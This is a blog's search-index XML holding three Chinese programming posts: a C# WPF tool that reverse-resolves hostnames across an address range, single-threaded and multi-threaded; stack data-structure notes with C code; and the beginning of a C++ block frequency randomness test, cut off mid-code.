<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>IP地址扫描</title>
      <link href="/2020/03/28/ip-di-zhi-sao-miao/"/>
      <url>/2020/03/28/ip-di-zhi-sao-miao/</url>
      
        <content type="html"><![CDATA[<h3 id="IP地址扫描———多线程和单线程"><a href="#IP地址扫描———多线程和单线程" class="headerlink" title="IP地址扫描———多线程和单线程"></a>IP地址扫描———多线程和单线程</h3><h5 id="布局界面及代码"><a href="#布局界面及代码" class="headerlink" title="布局界面及代码"></a>布局界面及代码</h5><blockquote><p>界面如下<br><img src="https://img-blog.csdnimg.cn/20200328092157499.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1YW5fcWlhbzkyNQ==,size_16,color_FFFFFF,t_70" alt="布局界面"></p></blockquote><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>Window x:Class<span class="token operator">=</span><span class="token string">"IP地址扫描.MainWindow"</span>        xmlns<span class="token operator">=</span><span class="token string">"http://schemas.microsoft.com/winfx/2006/xaml/presentation"</span>        xmlns:x<span class="token operator">=</span><span class="token string">"http://schemas.microsoft.com/winfx/2006/xaml"</span>        xmlns:d<span class="token operator">=</span><span class="token string">"http://schemas.microsoft.com/expression/blend/2008"</span>        xmlns:mc<span class="token operator">=</span><span class="token string">"http://schemas.openxmlformats.org/markup-compatibility/2006"</span>        xmlns:local<span class="token operator">=</span><span class="token string">"clr-namespace:IP地址扫描"</span>        mc:Ignorable<span class="token operator">=</span><span class="token string">"d"</span>        Title<span class="token operator">=</span><span class="token string">"IP扫描"</span> Height<span class="token operator">=</span><span class="token string">"450"</span> Width<span class="token operator">=</span><span class="token string">"800"</span>        WindowStartupLocation<span class="token operator">=</span><span class="token string">"CenterScreen"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>Window.Resources<span class="token operator">></span>        <span class="token operator">&lt;</span>Style TargetType<span class="token operator">=</span><span class="token string">"TextBox"</span><span class="token operator">></span>            <span class="token operator">&lt;</span>Setter Property<span class="token operator">=</span><span class="token string">"VerticalAlignment"</span> Value<span class="token operator">=</span><span class="token string">"Center"</span>/<span class="token operator">></span>            <span class="token operator">&lt;</span>Setter Property<span class="token operator">=</span><span class="token string">"HorizontalContentAlignment"</span> Value<span class="token operator">=</span><span class="token string">"Center"</span>/<span class="token operator">></span>            <span class="token operator">&lt;</span>Setter Property<span class="token operator">=</span><span class="token string">"Padding"</span> Value<span class="token operator">=</span><span class="token string">" 5 0 5 0 "</span>/<span class="token operator">></span>            <span class="token operator">&lt;</span>EventSetter Event<span class="token operator">=</span><span class="token string">"TextChanged"</span> Handler<span class="token operator">=</span><span class="token string">"TextBox_TextChanged"</span>/<span class="token operator">></span>        <span class="token operator">&lt;</span>/Style<span class="token operator">></span>    <span class="token operator">&lt;</span>/Window.Resources<span class="token operator">></span>    <span class="token operator">&lt;</span>Grid<span class="token operator">></span>        <span class="token operator">&lt;</span>Grid.RowDefinitions<span class="token operator">></span>            <span class="token operator">&lt;</span>RowDefinition Height<span class="token operator">=</span><span class="token string">"Auto"</span>/<span class="token operator">></span>            <span class="token operator">&lt;</span>RowDefinition Height<span class="token operator">=</span><span class="token string">"Auto"</span>/<span class="token operator">></span>            <span class="token operator">&lt;</span>RowDefinition/<span class="token operator">></span>        <span class="token operator">&lt;</span>/Grid.RowDefinitions<span class="token operator">></span>        <span class="token operator">&lt;</span>GroupBox Grid.Row<span class="token operator">=</span><span class="token string">"0"</span> Header<span class="token operator">=</span><span class="token string">"扫描的IP地址范围"</span> VerticalContentAlignment<span class="token operator">=</span><span class="token string">"Center"</span> Padding<span class="token operator">=</span><span class="token string">"10"</span><span class="token operator">></span>            <span class="token operator">&lt;</span>DockPanel<span class="token operator">></span>                <span class="token operator">&lt;</span>Label DockPanel.Dock<span class="token operator">=</span><span class="token string">"Left"</span> Content<span class="token operator">=</span><span class="token string">"地址前缀："</span>/<span class="token operator">></span>                <span class="token operator">&lt;</span>TextBox Name<span class="token operator">=</span><span class="token string">"txt1"</span> FontSize<span class="token operator">=</span><span class="token string">"20"</span> Text<span class="token operator">=</span><span class="token string">""</span> Width<span class="token operator">=</span><span class="token string">"100"</span>/<span class="token operator">></span>                <span class="token operator">&lt;</span>Label Content<span class="token operator">=</span><span class="token string">"起始值："</span> Margin<span class="token operator">=</span><span class="token string">"15 0 0 0"</span>/<span class="token operator">></span>                <span class="token operator">&lt;</span>TextBox Name<span class="token operator">=</span><span class="token string">"txtStart"</span> Text<span class="token operator">=</span><span class="token string">""</span> FontSize<span class="token operator">=</span><span class="token string">"22"</span> Margin<span class="token operator">=</span><span class="token string">"0,4,0,0"</span> VerticalAlignment<span class="token operator">=</span><span class="token string">"Top"</span> Width<span class="token operator">=</span><span class="token string">"60"</span>/<span class="token operator">></span>                <span class="token operator">&lt;</span>Label Content<span class="token operator">=</span><span class="token string">"终止值："</span> Margin<span class="token operator">=</span><span class="token string">"15 0 0 0"</span>/<span class="token operator">></span>                <span class="token operator">&lt;</span>TextBox Name<span class="token operator">=</span><span class="token string">"txtEnd"</span> Text<span class="token operator">=</span><span class="token string">""</span> FontSize<span class="token operator">=</span><span class="token string">"22"</span> Width<span class="token operator">=</span><span class="token string">"60"</span>/<span class="token operator">></span>                <span class="token operator">&lt;</span>Button Name<span class="token operator">=</span><span class="token string">"btn1"</span> Width<span class="token operator">=</span><span class="token string">"95"</span> VerticalAlignment<span class="token operator">=</span><span class="token string">"Center"</span>   Margin<span class="token operator">=</span><span class="token string">"80 5 0 5 "</span>  FontSize<span class="token operator">=</span><span class="token string">"22"</span> Content<span class="token operator">=</span><span class="token string">"单线程"</span> Click<span class="token operator">=</span><span class="token string">"btn1_Click"</span> /<span class="token operator">></span>                <span class="token operator">&lt;</span>Button Name<span class="token operator">=</span><span class="token string">"btn2"</span> Width<span class="token operator">=</span><span class="token string">"95"</span> VerticalAlignment<span class="token operator">=</span><span class="token string">"Center"</span> FontSize<span class="token operator">=</span><span class="token string">"22"</span>  Margin<span class="token operator">=</span><span class="token string">"20,5,0,5"</span>  Content<span class="token operator">=</span><span class="token string">"多线程"</span> Click<span class="token operator">=</span><span class="token string">"btn2_Click"</span> /<span class="token operator">></span>            <span class="token operator">&lt;</span>/DockPanel<span class="token operator">></span>        <span class="token operator">&lt;</span>/GroupBox<span class="token operator">></span>        <span class="token operator">&lt;</span>Label Name<span class="token operator">=</span><span class="token string">"labelError"</span> Grid.Row<span class="token operator">=</span><span class="token string">"1"</span> Content<span class="token operator">=</span><span class="token string">"IP地址有错，请更正！"</span> HorizontalContentAlignment<span class="token operator">=</span><span class="token string">"Center"</span> Background<span class="token operator">=</span><span class="token string">"Red"</span> Foreground<span class="token operator">=</span><span class="token string">"White"</span>/<span class="token operator">></span>        <span class="token operator">&lt;</span>GroupBox Grid.Row<span class="token operator">=</span><span class="token string">"2"</span> Header<span class="token operator">=</span><span class="token string">"扫描信息"</span><span class="token operator">></span>            <span class="token operator">&lt;</span>ListBox x:Name<span class="token operator">=</span><span class="token string">"listBoxInfo"</span>/<span class="token operator">></span>        <span class="token operator">&lt;</span>/GroupBox<span class="token operator">></span>    <span class="token operator">&lt;</span>/Grid<span class="token operator">></span><span class="token operator">&lt;</span>/Window<span class="token operator">></span></code></pre><h5 id="后台执行代码"><a href="#后台执行代码" class="headerlink" title="后台执行代码"></a>后台执行代码</h5><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Collections<span class="token punctuation">.</span>Generic<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Diagnostics<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Linq<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Net<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Text<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Threading<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Threading<span class="token punctuation">.</span>Tasks<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Windows<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Windows<span class="token punctuation">.</span>Controls<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Windows<span class="token punctuation">.</span>Data<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Windows<span class="token punctuation">.</span>Documents<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Windows<span class="token punctuation">.</span>Input<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Windows<span class="token punctuation">.</span>Media<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Windows<span class="token punctuation">.</span>Media<span class="token punctuation">.</span>Imaging<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Windows<span class="token punctuation">.</span>Navigation<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Windows<span class="token punctuation">.</span>Shapes<span class="token punctuation">;</span><span class="token keyword">namespace</span> IP地址扫描<span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/// &lt;summary></span>    <span class="token comment" spellcheck="true">/// MainWindow.xaml 的交互逻辑</span>    <span class="token comment" spellcheck="true">/// &lt;/summary></span>    <span class="token keyword">public</span> <span class="token keyword">partial</span> <span class="token keyword">class</span> <span class="token class-name">MainWindow</span> <span class="token punctuation">:</span> Window    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token function">MainWindow</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">InitializeComponent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            labelError<span class="token punctuation">.</span>Visibility <span class="token operator">=</span> System<span class="token punctuation">.</span>Windows<span class="token punctuation">.</span>Visibility<span class="token punctuation">.</span>Collapsed<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//声明一个字符串用于后续输出</span>        String s <span class="token operator">=</span> <span class="token string">"扫描地址：{0}，扫描时间：{1}毫秒，主机名称：{2}"</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// 输入时判断输入的IP地址是否有错，自动检验</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="sender">&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;param name="e">&lt;/param></span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">TextBox_TextChanged</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> TextChangedEventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">string</span> str1 <span class="token operator">=</span> txt1<span class="token punctuation">.</span>Text <span class="token operator">+</span> txtStart<span class="token punctuation">.</span>Text<span class="token punctuation">;</span>            <span class="token keyword">string</span> str2 <span class="token operator">=</span> txt1<span class="token punctuation">.</span>Text <span class="token operator">+</span> txtEnd<span class="token punctuation">.</span>Text<span class="token punctuation">;</span>            IPAddress ip1<span class="token punctuation">,</span> ip2<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>IPAddress<span class="token punctuation">.</span><span class="token function">TryParse</span><span class="token punctuation">(</span>str1<span class="token punctuation">,</span> <span class="token keyword">out</span> ip1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">false</span> <span class="token operator">||</span> <span class="token keyword">false</span> <span class="token operator">==</span>IPAddress<span class="token punctuation">.</span><span class="token function">TryParse</span><span class="token punctuation">(</span>str2<span class="token punctuation">,</span> <span class="token keyword">out</span> ip2<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                labelError<span class="token punctuation">.</span>Visibility <span class="token operator">=</span> System<span class="token punctuation">.</span>Windows<span class="token punctuation">.</span>Visibility<span class="token punctuation">.</span>Visible<span class="token punctuation">;</span>                btn1<span class="token punctuation">.</span>IsEnabled <span class="token operator">=</span> <span class="token keyword">false</span><span class="token punctuation">;</span>                btn2<span class="token punctuation">.</span>IsEnabled <span class="token operator">=</span> <span class="token keyword">false</span><span class="token punctuation">;</span>                <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>                labelError<span class="token punctuation">.</span>Visibility <span class="token operator">=</span> System<span class="token punctuation">.</span>Windows<span class="token punctuation">.</span>Visibility<span class="token punctuation">.</span>Collapsed<span class="token punctuation">;</span>                btn1<span class="token punctuation">.</span>IsEnabled <span class="token operator">=</span> <span class="token keyword">true</span><span class="token punctuation">;</span>                btn2<span class="token punctuation">.</span>IsEnabled <span class="token operator">=</span> <span class="token keyword">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        Stopwatch qiao<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//多线程</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">btn2_Click</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> RoutedEventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            btn1<span class="token punctuation">.</span>IsEnabled <span class="token operator">=</span> <span class="token keyword">false</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> start <span class="token operator">=</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>txtStart<span class="token punctuation">.</span>Text<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> end <span class="token operator">=</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>txtEnd<span class="token punctuation">.</span>Text<span class="token punctuation">)</span><span class="token punctuation">;</span>            count <span class="token operator">=</span> end <span class="token operator">-</span> start <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>start <span class="token operator">></span> end<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                MessageBox<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token string">"终止值必须大于等于起始值"</span><span class="token punctuation">,</span> <span class="token string">"地址范围有错"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            listBoxInfo<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            qiao <span class="token operator">=</span> Stopwatch<span class="token punctuation">.</span><span class="token function">StartNew</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> start<span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> end<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">string</span> strip <span class="token operator">=</span> txt1<span class="token punctuation">.</span>Text <span class="token operator">+</span> i<span class="token punctuation">;</span>                Thread t <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>Scan<span class="token punctuation">)</span><span class="token punctuation">;</span>                t<span class="token punctuation">.</span><span class="token function">Start</span><span class="token punctuation">(</span>strip<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//单线程</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">btn1_Click</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> RoutedEventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            btn2<span class="token punctuation">.</span>IsEnabled <span class="token operator">=</span> <span class="token keyword">false</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> start <span class="token operator">=</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>txtStart<span class="token punctuation">.</span>Text<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> end <span class="token operator">=</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>txtEnd<span class="token punctuation">.</span>Text<span class="token punctuation">)</span><span class="token punctuation">;</span>            count <span class="token operator">=</span> end <span class="token operator">-</span> start <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>start <span class="token operator">></span> end<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                MessageBox<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token string">"终止值必须大于等于起始值"</span><span class="token punctuation">,</span> <span class="token string">"地址范围有错"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            listBoxInfo<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            qiao <span class="token operator">=</span> Stopwatch<span class="token punctuation">.</span><span class="token function">StartNew</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> start<span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> end<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">string</span> strip <span class="token operator">=</span> txt1<span class="token punctuation">.</span>Text <span class="token operator">+</span> i<span class="token punctuation">;</span>                <span class="token function">Scan</span><span class="token punctuation">(</span>strip<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//计数器</span>        <span class="token keyword">int</span> num <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token keyword">object</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">Scan</span><span class="token punctuation">(</span><span class="token keyword">object</span> ip<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            num <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            Stopwatch duan <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stopwatch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            duan <span class="token operator">=</span> Stopwatch<span class="token punctuation">.</span><span class="token function">StartNew</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">string</span> host <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>            <span class="token keyword">try</span>            <span class="token punctuation">{</span>                host <span class="token operator">=</span> Dns<span class="token punctuation">.</span><span class="token function">GetHostEntry</span><span class="token punctuation">(</span>ip<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>HostName<span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">catch</span>            <span class="token punctuation">{</span>                host <span class="token operator">=</span> <span class="token string">"(不在线)"</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            duan<span class="token punctuation">.</span><span class="token function">Stop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            listBoxInfo<span class="token punctuation">.</span>Dispatcher<span class="token punctuation">.</span><span class="token function">Invoke</span><span class="token punctuation">(</span>                <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> listBoxInfo<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span>                    String<span class="token punctuation">.</span><span class="token function">Format</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> ip<span class="token punctuation">,</span> duan<span class="token punctuation">.</span>ElapsedMilliseconds<span class="token punctuation">,</span> host<span class="token punctuation">)</span>                    <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//总时间</span>            <span class="token keyword">lock</span> <span class="token punctuation">(</span>obj<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                num<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">==</span> count<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                qiao<span class="token punctuation">.</span><span class="token function">Stop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                listBoxInfo<span class="token punctuation">.</span>Dispatcher<span class="token punctuation">.</span><span class="token function">Invoke</span><span class="token punctuation">(</span>                    <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span> <span class="token keyword">this</span><span class="token punctuation">.</span>listBoxInfo<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token string">"总计耗时："</span> <span class="token operator">+</span> qiao<span class="token punctuation">.</span>ElapsedMilliseconds<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h5 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h5><ul><li>地址前缀输入的是    “xxx.xxx.xxx. “;比如你要检测从192.168.1.1到192.168.1.150,那么地址前缀输入 “192.168.1.”，在起始值输入1,在终止值输入150。</li></ul><p><img src="https://img-blog.csdnimg.cn/2020032809251886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1YW5fcWlhbzkyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>会自动监测不和法IP地址，并给出提示</li><li>单线程会出现阻塞的情况，即程序运行结束前无法移动界面，导致卡死假象。（正常情况就应该是这样的）</li><li>当进行单线程时，多线程按钮自动失效（不能点击）；当进行多线程时，单线程按钮自动失效。</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> C# </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Language </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈和队列.md</title>
      <link href="/2020/03/26/shu-ju-jie-gou-zhan/"/>
      <url>/2020/03/26/shu-ju-jie-gou-zhan/</url>
      
        <content type="html"><![CDATA[<h3 id="限定性线性表——栈和队列"><a href="#限定性线性表——栈和队列" class="headerlink" title="限定性线性表——栈和队列"></a>限定性线性表——栈和队列</h3><blockquote><p>限定线性表运算的位置(只允许在表的端点)</p></blockquote><h4 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h4><h5 id="栈的定义"><a href="#栈的定义" class="headerlink" title="栈的定义"></a>栈的定义</h5><ol><li>栈顶：表允许运算的一端</li><li>栈底： 不允许运算的一端</li><li>空栈：栈中没有元素</li></ol><h5 id="栈的常见运算"><a href="#栈的常见运算" class="headerlink" title="栈的常见运算"></a>栈的常见运算</h5><ol><li>表尾插入(进栈)</li><li>表尾删除（出栈）</li></ol><h5 id="栈的特性"><a href="#栈的特性" class="headerlink" title="栈的特性"></a>栈的特性</h5><ol><li>后进先出(LIFO)</li></ol><h5 id="栈的抽象数据类型定义"><a href="#栈的抽象数据类型定义" class="headerlink" title="栈的抽象数据类型定义"></a>栈的抽象数据类型定义</h5><ol><li>数据元素：属于同一数据对象的任意类型数据</li><li>关系：线性关系</li><li>基本操作：<ul><li>InitStack(S)  //初始化栈</li><li>ClearStack(S) //清空栈</li><li>IsEmpty(S)    //判空</li><li>IsFull(S)     //判满</li><li>Push(S,x)     //进栈</li><li>Pop0(S,x)     //出栈</li><li>GetTop(S,x)   //读栈顶</li></ul></li></ol><h4 id="栈运算的实现"><a href="#栈运算的实现" class="headerlink" title="栈运算的实现"></a>栈运算的实现</h4><blockquote><p>栈在计算机中有两种存储方式：顺序存储和链式存储。</p></blockquote><h5 id="顺序栈"><a href="#顺序栈" class="headerlink" title="顺序栈"></a>顺序栈</h5><ol><li>定义：用一组连续的存储单元一次存放自栈底到栈顶的数据元素</li><li>设一个栈顶指针top动态指示栈顶元素在顺序表中的位置</li><li>top = -1 表示空栈</li></ol><h5 id="函数的实现"><a href="#函数的实现" class="headerlink" title="函数的实现"></a>函数的实现</h5><ol><li>定义一个栈<pre class=" language-Cpp"><code class="language-Cpp">#define True 1#define False 0#define Stack_Size 50typedef struct{ StackElementType elem[Stack_Size]; int top;}SeqStack;</code></pre></li></ol><pre><code>2. 初始化```Cppvoid InitStack(SeqStack *S){    /*构造一个空栈*/    S-&gt;top = -1;}//S是具有顺序栈类型的一个变量</code></pre><ol start="3"><li>判空<pre class=" language-Cpp"><code class="language-Cpp">int IsEmpty(SeqStack *S){ /* S为空返回true；S为假返回false */ return (S->top == -1 ? TRUE:FALSE);}</code></pre></li></ol><pre><code>4. 判满```Cppint IsFull(SeqStack *S){    return (S-&gt;top == Stack_Size ? TRUE:FALSE);}</code></pre><ol start="5"><li>进栈<pre class=" language-Cpp"><code class="language-Cpp">int Push(SeqStack *S,StackElementType x){ if(S->top==Stack_Size) return False; //栈满 S->top++; S->elem[S->top] = x; return TRUE;}</code></pre></li></ol><pre><code>6. 出栈```Cppint Pop(SepStack *S,StackElementType *x){    if(S-&gt;top == -1) return False;    else    {        *x = S-&gt;elem[S-&gt;top];        S-&gt;top--;        return TRUE;    }}</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> programming </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>块内频数测试</title>
      <link href="/2020/03/24/kuai-nei-pin-shu-ce-shi/"/>
      <url>/2020/03/24/kuai-nei-pin-shu-ce-shi/</url>
      
        <content type="html"><![CDATA[<p>算法如下：</p><pre class=" language-cpp"><code class="language-cpp"><span class="token comment" spellcheck="true">/*名称：块内频数测试目的：块内频数测试是统计而原序列的每个M位非重叠比特块中“1”的比例，以检测每块中“0”和“1”的数量是否平衡，从而判断该序列是否具有随机性。特别地，当M=1时，即为单比特频数测试。参数说明：    n----------待测二元序列的长度    M----------每个比特块的长度，建议M >= 20且M >0.01n    N----------比特块的个数，N=[n/M],建议N &lt; 100    ε---------待测二元序列理论分布：卡方分布 */</span><span class="token comment" spellcheck="true">//算法实现</span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;cmath></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">convertToDec</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">convertAndCount</span><span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">double</span> <span class="token function">gamma1</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">double</span> <span class="token function">igamc</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//string str = 